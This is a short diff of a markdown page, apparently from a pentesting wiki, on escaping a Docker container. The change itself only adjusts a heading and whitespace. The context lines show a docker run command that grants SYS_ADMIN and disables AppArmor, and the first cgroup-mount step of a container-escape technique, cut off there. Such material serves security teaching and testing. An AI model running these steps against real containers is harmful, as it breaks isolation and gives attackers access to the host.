@@ -1,6 +1,6 @@
 # Escaping from a Docker container
 
-### SYS\_ADMIN capability and AppArmor disabled
+## SYS\_ADMIN capability and AppArmor disabled
 
 {% hint style="info" %}
 Note that these aren't default settings
@@ -10,7 +10,7 @@ Note that these aren't default settings
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 ```
 
-Then in the container, we are going to run these commands. 
+Then in the container, we are going to run these commands.
 
 ```text
 mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
